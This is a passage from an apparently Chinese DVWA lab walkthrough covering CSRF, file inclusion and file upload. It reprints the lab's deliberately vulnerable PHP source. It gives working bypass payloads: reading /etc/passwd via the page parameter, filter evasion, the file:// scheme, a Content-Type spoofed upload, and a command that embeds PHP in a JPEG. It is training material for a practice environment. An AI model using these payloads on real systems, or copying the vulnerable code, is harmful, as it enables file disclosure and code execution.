方法失效，对比正常请求的包，发现包中添加了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://192.168.23.133/dvwa/vulnerabilities/csrf/</span><br></pre></td></tr></table></figure><p>解决方案是将 csrf 网页部署在目标服务器 IP 作为的路径下。</p><h3 id="high-3"><a class="markdownIt-Anchor" href="#high-3">#</a> High</h3><ul><li>需要配合 XSS 攻击</li></ul><h2 id="file-inclusion"><a class="markdownIt-Anchor" href="#file-inclusion">#</a> File Inclusion</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//File Inclusion</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible File Inclusion Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High File Inclusion Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium File Inclusion Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low File Inclusion Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="low-4"><a class="markdownIt-Anchor" href="#low-4">#</a> Low</h3><ul><li>GET 方法传参，直接修改网址，查看 /etc/passwd</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page=/etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:996::/var/lib/chrony:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin dockerroot:x:997:994:Docker User:/var/lib/docker:/sbin/nologin </span><br></pre></td></tr></table></figure><h3 id="medium-4"><a class="markdownIt-Anchor" href="#medium-4">#</a> Medium</h3><ul><li><p>过滤了 “http://”, “https://”，“…/&quot;,&quot;…\&quot;</p></li><li><p>可以构造 &quot;httphttp://😕/&quot; 异形路径</p></li><li><p>同 Low 等级</p></li></ul><h3 id="high-4"><a class="markdownIt-Anchor" href="#high-4">#</a> High</h3><ul><li><p>加入黑名单机制，参数只能以 file 开头</p></li><li><p>构造参数</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=file:///etc/passwd</span><br></pre></td></tr></table></figure><ul><li>使用 file 协议访问本地文件</li></ul><h2 id="file-upload"><a class="markdownIt-Anchor" href="#file-upload">#</a> File Upload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//File Upload</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible File Upload Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line">    <span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line">    <span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line">    <span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( <span class="variable">$img</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) )</span><br><span class="line">            unlink( <span class="variable">$temp_file</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High File Upload Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium File Upload Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low File Upload Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="low-5"><a class="markdownIt-Anchor" href="#low-5">#</a> Low</h3><ul><li>随便上传，无限制</li></ul><h3 id="medium-5"><a class="markdownIt-Anchor" href="#medium-5">#</a> Medium</h3><ul><li>限制文件类型，但是可以改包上传 Content-Type: image/png</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/upload/ HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.23.133</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------24238774263872546046514723521</span><br><span class="line"></span><br><span class="line">Content-Length: 977</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.23.133</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.23.133/dvwa/vulnerabilities/upload/</span><br><span class="line"></span><br><span class="line">Cookie: security=low; PHPSESSID=otpvh75rdm983qnfc0scstgns0</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------24238774263872546046514723521</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line"></span><br><span class="line">-----------------------------24238774263872546046514723521</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;a.txt&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure><ul><li>txt 上传成功</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../hackable/uploads/a.txt succesfully uploaded!</span><br></pre></td></tr></table></figure><h3 id="high-5"><a class="markdownIt-Anchor" href="#high-5">#</a> High</h3><ul><li>加入内容检测和文件类型检测</li><li>通过在图片中加入一句话木马实现上传</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;? phpinfo() ?&gt;&quot; &gt;&gt;th.jpeg </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../hackable/uploads/th.jpeg succesfully uploaded!</span><br></pre></td></tr></table></figure><ul><li>通过文件包含漏洞解析上传图片</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 